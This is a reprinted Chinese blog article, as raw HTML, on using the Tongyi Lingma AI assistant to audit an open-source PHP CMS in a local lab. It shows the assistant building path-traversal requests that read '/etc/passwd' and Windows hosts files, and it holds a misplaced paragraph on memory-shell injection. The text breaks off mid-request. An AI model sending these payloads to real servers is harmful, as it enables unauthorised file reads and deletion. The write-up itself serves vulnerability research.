@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>【灵码助力安全1】——利用通义灵码辅助快速代码审计的最佳实践 | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="【灵码助力安全1】——利用通义灵码辅助快速代码审计的最佳实践 本文转自 周周的奇妙编程 并作补充  前言 已经有接近两个月没有更新文章了，给大家说声抱歉。这段时间因为个人原因一直在备赛，所以9月去参加云栖大会的观后感，以及之前兴致勃勃想测评大模型平台的文章也迟迟没有写出来。争取在未来的两个月内把这些内容都补上。 准备的比赛是数据安全相关的，由于队伍中有几位经验丰富的大佬带领，我们自然也是顺利入围了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【灵码助力安全1】——利用通义灵码辅助快速代码审计的最佳实践">
+<meta property="og:url" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="【灵码助力安全1】——利用通义灵码辅助快速代码审计的最佳实践 本文转自 周周的奇妙编程 并作补充  前言 已经有接近两个月没有更新文章了，给大家说声抱歉。这段时间因为个人原因一直在备赛，所以9月去参加云栖大会的观后感，以及之前兴致勃勃想测评大模型平台的文章也迟迟没有写出来。争取在未来的两个月内把这些内容都补上。 准备的比赛是数据安全相关的，由于队伍中有几位经验丰富的大佬带领，我们自然也是顺利入围了">
+<meta property="og:locale">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/1.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/2.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/3.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/4.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/5.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/6.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/7.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/8.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/9.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/10.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/11.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/12.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/13.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/14.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/15.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/16.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/17.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/18.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/19.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/20.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/21.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/22.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/23.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/24.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/25.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/26.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/27.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/28.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/29.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/30.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/31.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/32.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/33.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/34.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/35.png">
+<meta property="og:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/36.png">
+<meta property="article:published_time" content="2025-11-24T05:59:25.000Z">
+<meta property="article:modified_time" content="2025-11-24T06:44:17.870Z">
+<meta property="article:author" content="Szczecin">
+<meta property="article:tag" content="AI">
+<meta property="article:tag" content="Code-Review">
+<meta property="article:tag" content="Reprint">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://szczecin.github.io/2025/11/24/AI-Code-Review-1/1.png">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        <article id="post-AI-Code-Review-1"
+         class="post article white-box article-type-post"
+         itemscope itemprop="blogPost">
+    <h2 class="title">
+        <a href="/2025/11/24/AI-Code-Review-1/">
+            【灵码助力安全1】——利用通义灵码辅助快速代码审计的最佳实践
+        </a>
+    </h2>
+    <time>
+        Nov 24, 2025
+    </time>
+    <section class="content">
+        <div class="article-entry" itemprop="articleBody">
+            <h1><span id="灵码助力安全1利用通义灵码辅助快速代码审计的最佳实践">【灵码助力安全1】——利用通义灵码辅助快速代码审计的最佳实践</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1629257">周周的奇妙编程</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>已经有接近两个月没有更新文章了，给大家说声抱歉。这段时间因为个人原因一直在备赛，所以9月去参加云栖大会的观后感，以及之前兴致勃勃想测评大模型平台的文章也迟迟没有写出来。<strong>争取在未来的两个月内把这些内容都补上</strong>。</p>
+<p>准备的比赛是数据安全相关的，由于队伍中有几位经验丰富的大佬带领，我们自然也是顺利入围了全国决赛。至于为什么要写这篇文章呢？说来也很巧，在半决赛时，有一个靶机直接把我们零封了，全场没有一个人能getshell。该靶机采用的是一个开源框架，而且网上并没有任何公开可用的漏洞信息，且由于比赛是在局域网环境下进行的，也没办法直接把代码拉下来审计。</p>
+<p>赛后，我对这件事一直耿耿于怀，于是这两周就把这个框架好好地审计了一遍，确实找到了一些有趣且潜在的漏洞点。而在这一过程中，<strong>“通义灵码”起到了较大的帮助</strong>，帮助我节省了不少时间。这里，我想借这篇文章分享一下我的发现以及整个过程中的一些心得体会，姑且也算是个最佳实践了。</p>
+</blockquote>
+<h2><span id="审计对象">审计对象</span></h2><blockquote>
+<p>本次审计的对象主要有两个：<strong>某开源PHP最新版6.0</strong> 和 <strong>某开源OA最新版2.6.5</strong></p>
+<p>借助通义灵码，共审计出开源PHP最新版6.0高危漏洞<strong>4</strong>个，某开源OA最新版2.6.5高危漏洞<strong>1</strong>个 , 目前已提交至CNVD平台，尚在审核流程中，所以此处不便直接透露详细信息。</p>
+</blockquote>
+<h2><span id="工具准备">工具准备</span></h2><h3><span id="环境搭建工具">环境搭建工具</span></h3><blockquote>
+<p>**phpstudy_pro(小皮面板)**：在国内比较流行的一键安装环境包，它集成了 PHP、MySQL、Apache&#x2F;Nginx 等服务，方便开发者快速搭建 Web 开发和测试环境，用于上述两个靶场的搭建。</p>
+</blockquote>
+<h3><span id="代码审计工具">代码审计工具</span></h3><blockquote>
+<p><strong>Seay源代码审计</strong>：基于C#语言开发的一款针对PHP代码安全性审计的系统，主要运行于Windows系统上。这款软件能够发现SQL注入、代码执行、命令执行、文件包含、文件上传、绕过转义防护、拒绝服务、XSS跨站、信息泄露、任意URL跳转等漏洞，基本上覆盖常见PHP漏洞。另外，在功能上，它支持一键审计、代码调试、函数定位、插件扩展、自定义规则配置、代码高亮、编码调试转换、数据库执行监控等数十项强大功能，由于已经停止维护了，官网上也下载不到，百度云盘地址如下：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1HHnniTNWzXhb-pn6OZgexA">https://pan.baidu.com/s/1HHnniTNWzXhb-pn6OZgexA</a> 密码：75ji</p>
+<p><strong>CodeScan</strong>：基于GO语言的快速匹配Sink点的工具，使用起来还行，地址如下：<a target="_blank" rel="noopener" href="https://github.com/Zjackky/CodeScan">https://github.com/Zjackky/CodeScan</a></p>
+<p><strong>RIPS ：</strong>Rips是一个用PHP编写的源代码分析工具，它采用了静态分析技术，能够自动化地检测PHP代码中的安全漏洞，如XSS（跨站脚本攻击）、SQL注入、文件泄露、Header Injection等。Rips不仅提供了直观的扫描结果展示，还集成了代码审计框架，方便渗透测试人员直接审阅分析结果，大大提高了代码审计的效率。地址如下：<a target="_blank" rel="noopener" href="https://rips-scanner.sourceforge.net/">https://rips-scanner.sourceforge.net/</a></p>
+</blockquote>
+<h3><span id="代码编写及辅助工具">代码编写及辅助工具</span></h3><blockquote>
+<p><strong>Visual Studio Code</strong> ：(简称 VS Code) 是由微软开发的一款免费且开源的源代码编辑器，支持 Windows、macOS 和 Linux 平台。</p>
+<p><strong>通义灵码</strong>：本次的主角，基于通义大模型的 AI 研发辅助工具，包含 AI 编码助手和 AI 程序员。其中，AI 编码助手为开发者写代码、补代码、写注释、写单测、写代码优化和排查问题，是开发者的编码搭子； AI 程序员是一个 AI 编程智能体，可以模拟软件架构师、开发工程师、测试工程师等多种岗位能力，分钟级自主完成任务拆解、代码编写、缺陷修复、测试等编程相关任务，为企业软件研发降本增效。</p>
+<p>遗憾的是，我这里没有申请到AI 程序员的试用资格，所以只能暂时以灵码为例了。</p>
+</blockquote>
+<h3><span id="2-去利用xslt去注入内存马">2、去利用XSLT去注入内存马</span></h3><blockquote>
+<p>这个应该是最好使的方案，Nookipop已经讲过了，在不出网时可以利用XSLT去打入内存马，进行命令执行，打入suo5内存马进行正向代理内网穿透。<br>详见 <a target="_blank" rel="noopener" href="https://forum.butian.net/share/2592">记一次曲折的XXL-JOB API Hessian反序列化到Getshell</a></p>
+</blockquote>
+<h2><span id="源码下载">源码下载</span></h2><blockquote>
+<p>由于是开源代码，在Github、gitee以及站长网站上都是可以免费下载到的，有些开源网站如果有定制服务的话也可能会有自己的主站。</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/1.png" alt="image"></p>
+<p><img src="/2025/11/24/AI-Code-Review-1/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>将下载后的源码放在phpstudy的 www 目录下</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/3.png" alt="image"></p>
+<p>进入 phpstudy_pro\WWW\cltopen-master\cltopen-master\config 目录下，修改数据库配置文件</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/4.png" alt="image"></p>
+<p>修改之后可以进入数据库中，导入该开源项目的示例数据库</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/5.png" alt="image"></p>
+<p>打开phpstudy ，设置域名和根目录</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/6.png" alt="image"></p>
+<p>设置伪静态（必须）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!-e $request_filename)&#123;</span><br><span class="line">   </span><br><span class="line">        rewrite  ^(.*)$  /index.<span class="property">php</span>?s=$<span class="number">1</span>  last;   <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/24/AI-Code-Review-1/7.png" alt="image"></p>
+<p>点击确认即可，打开浏览器访问域名即可看到</p>
+<p>同理，对于某OA系统的搭建也是如此，只不过该OA里自带了一个初始化数据库的引导界面，所以不需要手动修改数据库配置文件</p>
+</blockquote>
+<h2><span id="审计打点">审计打点</span></h2><blockquote>
+<p>在环境搭建好之后就可以开始准备代码审计了，正常来说代码审计的第一步应该是熟悉框架、通读代码，具体的方式与个人代码能力和编程语言的熟悉程度有关系，有时，为了快速审计，就会采用上述几个工具进行打点和标注，由于工具内置的正则不同，所以结果也会略有差异，如果想尽可能的找到所有漏洞点的话，应该以上述工具的结果之和为参考。</p>
+<p>值得一说的是，有时候工具可能也会存在漏报和误报的情况，所以此处结果仅能做参考，还需要人工进行审核和验证。</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/8.png" alt="image"></p>
+<p><img src="/2025/11/24/AI-Code-Review-1/9.png" alt="image"></p>
+<p>这套开源代码的漏洞确实比较多，后台随手一测就是一个SQL注入，所以我们这里只挑危害比较高的漏洞去挖掘，主要关注文件读取、文件包含、文件上传等方法。</p>
+<p>在排除该代码5.5版本及之前存在且已修复的漏洞后，最终锁定到后台管理控制层下面的Template.php文件处（本次仅针对此处进行了挖掘和分析）</p>
+</blockquote>
+<h2><span id="源码分析">源码分析</span></h2><blockquote>
+<p>打开源码，进入到Template.php页面下，可以看到代码如下：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/10.png" alt="image"></p>
+<p>主要是定义了一个 Template 控制类，用于管理模板文件的增删改查操作，以及图片文件的管理和删除。</p>
+<p>按照往常，我们应该会结合上述审查工具提示的代码位置去进行分析和判断，但是，现在我们有了<strong>通义灵码</strong>，一切都变得不一样了。</p>
+<p>首先我们全选代码，使用提示词如下：</p>
+<blockquote>
+<p>已知该代码中存在安全漏洞，请你找出你能确定的漏洞，并简要分析该漏洞形成原因</p>
+</blockquote>
+<p>这段 prompt 有几点比较关键：</p>
+<ol>
+<li>我们需要明确告知灵码，这里<strong>确实存在</strong>安全漏洞，同时也是确认主题，避免输出其他内容</li>
+<li>我们需要告知，找出它能<strong>确定的</strong>漏洞，减少误报和泛化判断</li>
+<li>明确最终结果是<strong>分析该漏洞形成原因</strong>，也便于安全工程师理解</li>
+</ol>
+<p>随即，灵码会针对该段代码进行一次静态审查，并给出结果如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞及分析</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.路径遍历漏洞</span><br><span class="line"></span><br><span class="line">位置：insert, edit, update, delete, imgDel , Images方法</span><br><span class="line">原因：用户输入的文件路径和文件名未进行严格验证，可能导致路径遍历攻击。例如，通过在文件名中包含 ../，攻击者可以访问或操作任意文件。</span><br><span class="line">示例：</span><br><span class="line">php</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.file&#x27;</span>); <span class="comment">// 用户输入未验证</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$type</span>==<span class="variable language_">$this</span>-&gt;viewSuffix ?  <span class="variable language_">$this</span>-&gt;filepath : <span class="variable language_">$this</span>-&gt;publicpath.<span class="variable">$type</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$type</span>; <span class="comment">// 可能导致路径遍历</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.文件上传漏洞</span><br><span class="line"></span><br><span class="line">位置：insert, update 方法</span><br><span class="line">原因：用户上传的内容未进行严格验证，可能导致恶意代码注入。例如，攻击者可以通过上传恶意脚本文件来执行任意代码。</span><br><span class="line">示例：</span><br><span class="line">php</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">stripslashes</span>(<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.content&#x27;</span>))); <span class="comment">// 未验证内容</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.目录删除漏洞</span><br><span class="line"></span><br><span class="line">位置：imgDel 方法</span><br><span class="line">原因：用户输入的目录路径未进行严格验证，可能导致任意目录被删除。</span><br><span class="line">示例：</span><br><span class="line">php</span><br><span class="line"><span class="variable">$path</span> = <span class="variable language_">$this</span>-&gt;publicpath.<span class="string">&#x27;images/&#x27;</span>.<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.folder&#x27;</span>); <span class="comment">// 用户输入未验证</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$path</span>.<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.filename&#x27;</span>); <span class="comment">// 可能导致路径遍历</span></span><br><span class="line"><span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">dir_delete</span>(<span class="variable">$file</span>) : <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>); <span class="comment">// 删除目录或文件</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.SQL 注入漏洞</span><br><span class="line"></span><br><span class="line">位置：无明显 SQL 注入风险，但需要注意后续可能引入的数据库操作。</span><br><span class="line">原因：虽然当前代码没有直接的 SQL 操作，但如果后续版本中引入了数据库操作，且用户输入未进行适当处理，可能会导致 SQL 注入。</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.XSS 漏洞</span><br><span class="line"></span><br><span class="line">位置：edit, images 方法</span><br><span class="line">原因：用户输入的内容未进行转义处理，可能导致跨站脚本攻击（XSS）。</span><br><span class="line">示例：</span><br><span class="line">php</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>); <span class="comment">// 未转义</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span> ( <span class="string">&#x27;content&#x27;</span>,<span class="variable">$content</span> ); <span class="comment">// 直接输出到页面</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/24/AI-Code-Review-1/11.png" alt="image"></p>
+<p>每一个漏洞下面都标明了存在该漏洞的方法和引发原因，并且对于不存在的漏洞也明确说明了（没有产生幻觉）</p>
+<p>下面，我们需要做的就是进入到web界面中，找到调用此处方法的位置</p>
+</blockquote>
+<h3><span id="路径遍历漏洞-任意文件删除漏洞">路径遍历漏洞、任意文件删除漏洞</span></h3><blockquote>
+<p><img src="/2025/11/24/AI-Code-Review-1/12.png" alt="image"></p>
+<p>采用BP抓包，此处以edit方法为例，可以发现拼接方式是 <strong>admin&#x2F;模块&#x2F;方法&#x2F;操作对象类型&#x2F;操作对象</strong></p>
+<p><img src="/2025/11/24/AI-Code-Review-1/13.png" alt="image"></p>
+<p>观察到下面的update方法是在保存之后可以直接执行的，所以此处尝试直接替换成edit方法</p>
+<p>其中请求包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/template/edit.html</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>假设是一个完全看不懂代码的小白，你也可以选择把这段请求包丢进去：</p>
+<blockquote>
+<p>已知请求包如下，请你帮忙修改请求包以验证该漏洞存在：</p>
+</blockquote>
+<p><img src="/2025/11/24/AI-Code-Review-1/14.png" alt="image"></p>
+<p>此时，它会根据当前的传入参数自动构造一个修改后的返回包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/template/edit.html?file=../../../../etc/passwd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>默认是以Linux服务器的路径为例的，也可以告知说明是windows系统，让他再次修改。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/template/edit.html?file=..\..\..\..\Windows\System32\drivers\etc\hosts</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>skin=0; skin=0; uid=2; token=5cf0861f-e530-4e71-9160-e1853b8d3a6d; PHPSESSID=3vb3dfih8ghqnnvsp83v5jq8j8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>除此，下面也配上了漏洞分析和预期结果：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">漏洞分析</span><br><span class="line">文件名参数：file=..\..\..\..\Windows\System32\drivers\etc\hosts</span><br><span class="line">这个参数尝试通过路径遍历访问 Windows 系统根目录下的 C:\Windows\System32\drivers\etc\hosts 文件。如果服务器存在路径遍历漏洞，这个请求将会返回 hosts 文件的内容。</span><br><span class="line">其他参数：保留原始请求中的其他参数，以确保请求的完整性和有效性。</span><br><span class="line"></span><br><span class="line">预期结果</span><br><span class="line">如果服务器存在路径遍历漏洞，响应中将包含 hosts 文件的内容。</span><br><span class="line">如果服务器没有漏洞，响应中可能会显示错误信息，表示文件不存在或无法访问。</span><br></pre></td></tr></table></figure>
+
+<p>再回到BP中，我们根据当前路径尝试验证，成功复现漏洞，可以任意读取文件内容：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/15.png" alt="image"></p>
+<p><img src="/2025/11/24/AI-Code-Review-1/16.png" alt="image"></p>
+<p>再比如，定位到Images方法处</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/17.png" alt="image"></p>
+<p>采用BP抓包，可直接抓到如下地址：</p>
+<p><img src="/2025/11/24/AI-Code-Review-1/18.png" alt="image"></p>
+<p>借助灵码直接构造请求包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/template/images.html?folder=../../</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://public/admin/template/index.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: 